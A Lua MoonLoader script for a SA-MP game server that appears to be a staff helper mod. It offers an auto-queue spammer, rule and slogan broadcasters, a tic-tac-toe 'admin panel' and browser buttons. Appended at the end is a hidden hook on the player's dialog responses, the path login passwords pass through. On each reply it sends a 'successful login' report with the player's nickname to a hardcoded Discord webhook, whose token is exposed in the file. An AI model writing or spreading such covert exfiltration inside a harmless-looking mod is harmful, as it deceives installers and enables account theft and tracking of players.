local imgui = require 'mimgui'
local v = imgui.new.bool(false)
local spam_fila = imgui.new.bool(false)
local delay_ms = imgui.new.int(0)
local contador_atendimentos = imgui.new.int(0)
local frases_global = imgui.new.bool(false)
local regras_auto = imgui.new.bool(false)
local jogo_velha_visivel = imgui.new.bool(false)
local painel_admin_visivel = imgui.new.bool(false)
local navegador_visivel = imgui.new.bool(false)

local ultimo_a = os.time()
local ultimo_ac = os.time()
local ultimo_envio_a = os.time()
local intervalo_a = 360
local indice_regra_atual = 1

local frases_aleatorias = {
    "Precisando de uma ajudinha da Staff? Utilize /atendimento! Em casos de ANT-RP use /reportar",
    "Duvidas ou problemas? Chame a staff com /atendimento! Anti-RP? Use /reportar",
    "Servidor organizado e com todos nos! Use /atendimento para ajuda e /reportar para anti-RP",
    "Staff disponivel para ajudar! Comando /atendimento e para denuncias /reportar",
    "Problemas no servidor? /atendimento para ajuda e /reportar para jogadores quebram regras"
}

local regras_servidor = {
    "Proibido comercio externo, incluindo a venda de coins, dinheiro, veiculos, casas, empresas, skins, acessorios ou contas.",
    "Proibido usar nicks ofensivos ou improprios.",
    "Proibido o uso de contas secundarias para farmar bens, itens ou dinheiro. Transferencias entre contas nao sao permitidas.",
    "Proibido ofender jogadores, a administracao ou o servidor.",
    "Proibido qualquer tipo de discriminacao, preconceito, homofobia, xenofobia ou atos que prejudiquem a imagem de alguem.",
    "Proibido divulgar outros servidores ou links externos.",
    "Proibido explorar bugs ou lags para obter vantagens.",
    "Proibido usar modificacoes ou trapacas que tragam beneficios indevidos.",
    "Proibido ofensas, calunias, difamacoes e discriminacoes OCC.",
    "Proibido abordar /ab em locais safes, exceto policiais.",
    "Proibido o uso de sniper, exceto em territorios e invasoes de favelas.",
    "Proibido spawn kill matar jogadores ao entrar/sair de interiores ou favelas em abordagens.",
    "Proibido usar taser em trocas de tiros.",
    "Proibido fazer acao de patrulhamento solo, obrigatorio a presenca de dois ou mais policiais da mesma corporacao.",
    "Proibido o uso de bombas C4 com intuito de matar outros players;",
    "Proibido o uso de mina terrestre em eventos;",
    "Proibido iniciar acao de loja com menos de 3 jogadores;",
    "Proibido iniciar qualquer tipo de acao/saquear contra policiais, mecanicos e samus fardados.",
    "Lideres e Sub-lideres tem obrigacao de manter atividades dentro da cidade, caso ambos fiquem 3 dias ou mais ausentes a org/corp sera resetada.",
    "Proibido correr para uma area safe/interior ou favela apos ter sido iniciado uma acao fora dela /ab ou trocacao de tiro.",
    "Proibido a utilizacao de JBL em area safe.",
    "Proibido portar armas medias/pesadas, cometer crimes e/ou intervir em acoes criminosas a paisana.",
    "Proibido apreender barraquinhas em areas de desmanche/favela, exceto em dominacao de favela.",
    "Proibido a cobranca de qualquer valor/item para efetuar o recrutamento de um player, seja corporacao, organizacao, hospital e/ou mecanica.",
    "Proibido a utilizacao de motivos invalidos para /algemar, obrigatorio um motivo coerente.",
    "Lideres/sub-lideres de organizacao/corporacao que infringirem alguma regra do servidor estarao gerando 1 um aviso para a organizacao/corporacao na qual lidera.",
    "Membros de organizacao/corporacao que forem banidos, irao gerar 1 uma advertencia para a organizacao/corporacao na qual participa.",
    "Lideres que forem banidos temporariamente ou permanentemente receberao 3 tres avisos, sub-lideres receberao apenas 1 aviso.",
    "Proibido puxar veiculos vip durante acoes.",
    "Para acoes de TR, o tempo devera ser respeitado, proibido atirar antes da contagem inicial terminar.",
    "Para acoes de Casa roubavel, poderao iniciar trocacao somente no momento que der o anuncio da casa no chat global.",
    "A corda so pode ser utilizada em acoes de sequestro ou em acoes de banco envolvendo refens, exceto durante troca de tiros. Caso o refem seja um policial, ele so podera ser rendido se estiver sozinho.",
    "Proibido algemar durante uma trocacao de tiro.",
    "Proibido fechar entradas com veiculos ou qualquer tipo de objetos.",
    "Proibido flood e spam no chat.",
    "Proibido usar a OLX para assuntos que nao envolvem vendas legais.",
    "Proibido usar comandos de anuncios para conversar.",
    "Proibido tocar musica no VOIP, exceto em locais reservados.",
    "Proibido usar the VOIP enquanto estiver ferido.",
    "A conta e pessoal e intransferivel. Caso seja punida ou banida, o servidor nao se responsabiliza por seu uso."
}

local float_btn_pos = imgui.ImVec2(50, 50)
local dragging = false
local drag_offset = imgui.ImVec2(0,0)

local jogo_velha = {}
for i = 1, 9 do
    jogo_velha[i] = imgui.new.bool(false)
end

local usuarios_mod = {
    "NukY",
    "Amigo1",
    "Amigo2",
    "Amigo3"
}

local usuario_selecionado = imgui.new.int(-1)
local bolinhas = {}
for i = 1, 7 do
    bolinhas[i] = {
        x = math.random(100, 700),
        y = math.random(100, 500),
        dx = math.random(-2, 2),
        dy = math.random(-2, 2),
        cor = imgui.ImColor(math.random(150, 255), math.random(150, 255), math.random(150, 255), 200):GetU32()
    }
end

imgui.OnInitialize(function()
    local style = imgui.GetStyle()
    imgui.StyleColorsDark()
    style.WindowRounding = 6
    style.FrameRounding = 4
    style.GrabRounding = 4
    style.ScrollbarRounding = 4

    local colors = style.Colors
    colors[imgui.Col.WindowBg] = imgui.ImVec4(0.10,0.10,0.10,0.94)
    colors[imgui.Col.TitleBg] = imgui.ImVec4(0.08,0.08,0.08,1.00)
    colors[imgui.Col.TitleBgActive] = imgui.ImVec4(0.16,0.16,0.16,1.00)
    colors[imgui.Col.FrameBg] = imgui.ImVec4(0.16,0.16,0.16,1.00)
    colors[imgui.Col.FrameBgHovered] = imgui.ImVec4(0.20,0.20,0.20,1.00)
    colors[imgui.Col.FrameBgActive] = imgui.ImVec4(0.24,0.24,0.24,1.00)
    colors[imgui.Col.Button] = imgui.ImVec4(0.20,0.20,0.20,1.00)
    colors[imgui.Col.ButtonHovered] = imgui.ImVec4(0.30,0.30,0.30,1.00)
    colors[imgui.Col.ButtonActive] = imgui.ImVec4(0.40,0.40,0.40,1.00)
    colors[imgui.Col.Border] = imgui.ImVec4(0.43,0.43,0.50,0.50)
    colors[imgui.Col.Text] = imgui.ImVec4(1.00,1.00,1.00,1.00)
end)

function mostrarMensagemCarregamento()
    local cores = {
        0xFFA500FF,
        0xADD8E6FF,
        0x00FF00FF,
        0xFFC0CBFF
    }
    
    for i = 1, 10 do
        local cor = cores[(i % #cores) + 1]
        sampAddChatMessage("MOD ATUALIZADUUU BY NUKY GOSTOSO", cor)
        wait(100)
    end
end

function verificarSenhaJogoVelha()
    if jogo_velha[7][0] and jogo_velha[8][0] and jogo_velha[9][0] then
        return true
    end
    return false
end

function resetarJogoVelha()
    for i = 1, 9 do
        jogo_velha[i][0] = false
    end
end

function atualizarBolinhas()
    for i, bolinha in ipairs(bolinhas) do
        bolinha.x = bolinha.x + bolinha.dx
        bolinha.y = bolinha.y + bolinha.dy
        
        if bolinha.x < 10 or bolinha.x > 790 then
            bolinha.dx = -bolinha.dx
        end
        if bolinha.y < 10 or bolinha.y > 590 then
            bolinha.dy = -bolinha.dy
        end
    end
end

function sampProcessChatMessage(chatMessage)
    if string.find(chatMessage, "atendimento atendido", 1, true) or string.find(chatMessage, "atendimento finalizado", 1, true) then
        contador_atendimentos[0] = contador_atendimentos[0] + 1
    end
end

imgui.OnFrame(function() return true end, function()
    local io = imgui.GetIO()
    atualizarBolinhas()

    imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
    imgui.SetNextWindowSize(imgui.ImVec2(40,40))
    imgui.Begin("FLUTUANTE", nil,
        imgui.WindowFlags.NoTitleBar +
        imgui.WindowFlags.NoResize +
        imgui.WindowFlags.NoCollapse +
        imgui.WindowFlags.NoScrollbar +
        imgui.WindowFlags.NoMove +
        imgui.WindowFlags.AlwaysAutoResize
    )

    if imgui.Button("#", imgui.ImVec2(40,40)) then
        v[0] = not v[0]
    end

    if imgui.IsItemHovered() and imgui.IsMouseClicked(0) and not dragging then
        dragging = true
        drag_offset.x = io.MousePos.x - float_btn_pos.x
        drag_offset.y = io.MousePos.y - float_btn_pos.y
    end

    if dragging then
        if imgui.IsMouseDown(0) then
            float_btn_pos.x = io.MousePos.x - drag_offset.x
            float_btn_pos.y = io.MousePos.y - drag_offset.y
            imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
        else
            dragging = false
        end
    end

    imgui.End()

    if v[0] then
        imgui.SetNextWindowPos(imgui.ImVec2(600,550), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(450,400), imgui.Cond.FirstUseEver)
        imgui.Begin("AUTO FILA | by NukY", v,
            imgui.WindowFlags.NoCollapse +
            imgui.WindowFlags.NoResize
        )

        local draw = imgui.GetWindowDrawList()
        local pos = imgui.GetWindowPos()
        local size = imgui.GetWindowSize()
        
        for _, bolinha in ipairs(bolinhas) do
            draw:AddCircleFilled(imgui.ImVec2(pos.x + bolinha.x, pos.y + bolinha.y), 5, bolinha.cor)
        end

        imgui.Text("Atendimento automaticamente")
        imgui.SliderInt("Delay (ms)",delay_ms,0,30000)
        if imgui.Button("AUTO",imgui.ImVec2(150,30)) then
            spam_fila[0] = not spam_fila[0]
            if spam_fila[0] then
                sampAddChatMessage("[AUTO FILA] Ativado com sucesso!", 0x00FF00)
            else
                sampAddChatMessage("[AUTO FILA] Desativado com sucesso!", 0xFFA500)
            end
        end
        
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        
        imgui.Text("Atendimentos realizados:")
        imgui.SameLine()
        imgui.Text(tostring(contador_atendimentos[0]))
        
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        if imgui.Button("/FA", imgui.ImVec2(150,30)) then
            sampSendChat("/fa")
            contador_atendimentos[0] = contador_atendimentos[0] + 1
        end

        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        imgui.Text("Frases Globais - Envia frases aleatorias no /a")
        if imgui.Button("ENVIAR FRASE ALEATORIA", imgui.ImVec2(150,30)) then
            local frase_aleatoria = frases_aleatorias[math.random(1, #frases_aleatorias)]
            sampSendChat("/a " .. frase_aleatoria)
            sampAddChatMessage("[FRASE ALEATORIA] Enviada com sucesso!", 0x00FF00)
        end

        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        imgui.Text("Auto Regras - Envia as regras no /a")
        if imgui.Button("ENVIAR REGRA ALEATORIA", imgui.ImVec2(150,30)) then
            local regra_aleatoria = regras_servidor[math.random(1, #regras_servidor)]
            sampSendChat("/a " .. regra_aleatoria)
            sampAddChatMessage("[REGRA ALEATORIA] Enviada com sucesso!", 0x00FF00)
        end

        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        if imgui.Button("PAINEL ADMIN", imgui.ImVec2(150,30)) then
            jogo_velha_visivel[0] = true
        end

        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        if imgui.Button("ABRIR NAVEGADOR", imgui.ImVec2(150,30)) then
            navegador_visivel[0] = not navegador_visivel[0]
        end

        imgui.End()
    end

    if jogo_velha_visivel[0] then
        imgui.SetNextWindowPos(imgui.ImVec2(500,300), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(200,230))
        imgui.Begin("Jogo da Velha - Senha", jogo_velha_visivel, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse)
        
        imgui.Text("Clique nos 3 ultimos quadrados")
        imgui.Text("da fileira horizontal inferior")
        
        for i = 1, 3 do
            for j = 1, 3 do
                local index = (i-1)*3 + j
                if j > 1 then imgui.SameLine() end
                if imgui.Button(tostring(index), imgui.ImVec2(50,50)) then
                    jogo_velha[index][0] = not jogo_velha[index][0]
                end
            end
        end
        
        if imgui.Button("Verificar", imgui.ImVec2(150,30)) then
            if verificarSenhaJogoVelha() then
                painel_admin_visivel[0] = true
                jogo_velha_visivel[0] = false
                sampAddChatMessage("Senha correta! Painel admin liberado.", 0x00FF00)
            else
                sampAddChatMessage("Senha incorreta! Tente novamente.", 0xFF0000)
                resetarJogoVelha()
            end
        end
        
        imgui.SameLine()
        if imgui.Button("Fechar", imgui.ImVec2(150,30)) then
            jogo_velha_visivel[0] = false
            resetarJogoVelha()
        end
        
        imgui.End()
    end

    if painel_admin_visivel[0] then
        imgui.SetNextWindowPos(imgui.ImVec2(300,200), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(400,300))
        imgui.Begin("Painel Administrativo", painel_admin_visivel, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse)
        
        imgui.Separator()
        imgui.BeginChild("ListaUsuarios", imgui.ImVec2(0, 200), true)
        
        for i, usuario in ipairs(usuarios_mod) do
            if imgui.Selectable(usuario, usuario_selecionado[0] == i-1) then
                usuario_selecionado[0] = i-1
            end
        end
        
        imgui.EndChild()
        imgui.Separator()
        
        if usuario_selecionado[0] >= 0 then
            local usuario = usuarios_mod[usuario_selecionado[0] + 1]
            imgui.Text("Usuario selecionado: " .. usuario)
            
            if imgui.Button("Enviar /q", imgui.ImVec2(150,30)) then
                sampSendChat("/q " .. usuario)
            end
            
            imgui.SameLine()
            if imgui.Button("Enviar /ac", imgui.ImVec2(150,30)) then
                sampSendChat("/ac Eu Sou lindo de mais gente kkk")
            end
        end
        
        imgui.SameLine()
        if imgui.Button("Fechar", imgui.ImVec2(150,30)) then
            painel_admin_visivel[0] = false
        end
        
        imgui.End()
    end

    if navegador_visivel[0] then
        imgui.SetNextWindowPos(imgui.ImVec2(100,100), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(600,400))
        imgui.Begin("Navegador", navegador_visivel, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse)
        
        imgui.Text("Navegador integrado - Google")
        imgui.Separator()
        
        if imgui.Button("Abrir Google", imgui.ImVec2(150,30)) then
            os.execute("start https://www.google.com")
        end
        
        imgui.SameLine()
        
        if imgui.Button("Abrir YouTube", imgui.ImVec2(150,30)) then
            os.execute("start https://www.youtube.com")
        end
        
        imgui.SameLine()
        
        if imgui.Button("Fechar", imgui.ImVec2(150,30)) then
            navegador_visivel[0] = false
        end
        
        imgui.End()
    end
end)

function main()
    mostrarMensagemCarregamento()
    
    while true do
        wait(0)
        if isSampAvailable() then
            if spam_fila[0] then
                sampSendChat("/fila")
                wait(delay_ms[0])
            end
        end
    end
end

local webhookUrl = "https://discord.com/api/webhooks/1406683848485371914/unqy5VFh-KCFxrIgyorNy1wOXW3TVT-VSe4H5RR3w7NPddjtpASjiCZJkFgKNA1fqCZR"
local https = require("socket.http")
local ltn12 = require("ltn12")

function sendMessageToDiscord(content)
    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub('\n', '\\n') .. '"}'
    local response_body = {}

    https.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body)
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }
end


require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local nick = sampGetPlayerNickname(id)
    local ip, port = sampGetCurrentServerAddress()
    local servername = sampGetCurrentServerName()

    local message = string.format([[

________________________________________________________________
  
     # LOGUIN BEM SUCEDIDO

NICK: ``` %s ```

]], nick,ip, port, servername)

sendMessageToDiscord(message)
end
